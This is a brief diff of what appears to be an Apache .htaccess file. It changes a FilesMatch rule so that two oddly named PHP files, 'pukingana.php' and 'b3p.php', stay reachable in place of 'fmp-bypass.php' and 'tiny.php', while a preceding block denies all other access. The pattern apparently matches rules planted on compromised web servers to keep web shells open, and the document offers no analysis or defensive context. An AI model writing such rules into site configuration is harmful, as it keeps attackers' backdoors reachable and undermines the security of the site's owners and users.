@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(fmp-bypass.php|tiny.php)$">
+<FilesMatch "^(pukingana.php|b3p.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
